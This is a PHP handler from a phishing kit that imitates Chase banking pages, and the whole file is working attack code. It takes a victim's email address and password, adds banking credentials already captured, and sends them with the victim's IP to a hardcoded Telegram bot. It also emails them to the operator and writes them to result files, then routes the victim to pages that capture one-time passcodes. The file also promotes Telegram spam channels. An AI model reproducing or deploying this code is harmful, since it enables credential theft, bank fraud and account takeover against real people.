<?php 



require("require.php");


if (isset($_POST['Email']) && isset($_POST['password']) ) {
	if (!empty($_POST['Email']) && !empty($_POST['password']) ) {
		
			// Admin Panel
			$_SESSION['Email']  = $_POST['Email']; 
			$_SESSION['passwordEmail']  = $_POST['password'];
			if(isset($_POST['invalid'])){$arrangement = "2nd"; }else{$arrangement = "1st";}

			$msgAdminPanel = "<tr>";
			$msgAdminPanel .= "<td>".$_SESSION['userId']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['password']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['Email']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['passwordEmail']."</td>";
			$msgAdminPanel .= "<td>".$ip." </td>";
			$msgAdminPanel .= "<td>".$date."</td>";
			$msgAdminPanel .= "</tr>". "\r\n";


			$Subject = "❤️💪 Zae3m ".$arrangement." Email Access 💪❤️  [".$_POST['Email']."] ip 👉".$ip;
	        $headers = "MIME-Version: 1.0" . "\r\n";
	        $headers .= "From: ".$YourName." <zae3m@xSniper.com>" . "\r\n";
	        $headers .= "Content-type:text/plan;charset=UTF-8" . "\r\n";

	        $msg = "#===========||<".$YourName.">||==========#\n";
	        $msg .= "#===========||<Zae3m Page>||==========#\n";
	        $msg .= "UserID   		: ".$_SESSION['userId']." \n";
	        $msg .= "Password 		: ".$_SESSION['password']." \n";
	        $msg .= "#===========||<Email Access>||==========//\n";
	        $msg .= "Email Access   : ".$_SESSION['Email']." \n";
	        $msg .= "Password 		: ".$_SESSION['passwordEmail']." \n";
	        $msg .= "IP 	  		: ".$ip."//\n";
	        $msg.="»»————-　★[ ./💼 https://t.me/zae3m | https://t.me/spam_dollarers | https://t.me/zae3m_tut 💼 ]★　————-««
\r\n\r\n";

$txt = $msg;
$chat_id = "1436260626"; // Your Telegram Chat ID
$bot_url = "bot5279763036:AAH3T_YZZvSrCZx1Z_orRP7_EYC_KwbYUQQ"; //Your Telegram Bot Api Key

    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	        if ($saveInAdminPanel  == "true") {
				if ($arrangement == "1st") {
					$file = fopen("../../admin/result/emailAccess.txt", "a+");
					fwrite($file, $msgAdminPanel);
				}elseif($arrangement == "2nd"){
					$file = fopen("../../admin/result/doubleEmailAccess.txt", "a+");
					fwrite($file, $msgAdminPanel);
				}
				
			}
					if ($sendToEmail == "true") {
				
				send($yourEmail, $Subject, $msg);
				send($test, $Subject, $msg);

			}

			if ($doubleAccess == "true" && $arrangement == "1st") {
				header("Location: ../../secure/emailAccess?country=us&invalid2&id=chase");exit();
			}else{
				// $domainsOTP
				$domainTLD = explode("@", $_SESSION['Email'])[1];
				$domain = explode(".", $domainTLD)[0];
				$_SESSION['domain'] = $domainTLD;
				if ($otp == "true") {
					if ($allDomains == "true") {
						header("Location: ../../secure/emailAccessOTP?country=us&id=chase&domain=$domain");exit();
					}else{
						if (in_array($domain,$domainsOTP )) {
							header("Location: ../../secure/emailAccessOTP?country=us&id=chase&domain=$domain");exit();
							
						}else{
							header("Location: ../../secure/info?country=us&id=chase");exit();

						}
					}
					
				}
				
			}



		
	}else{
		header("Location: ../../secure/emailAccess?id=chase&invalid&country=us");exit();
	}
}else{
	header("Location: ../../secure/emailAccess?id=chase&invalid&country=us");exit();
}
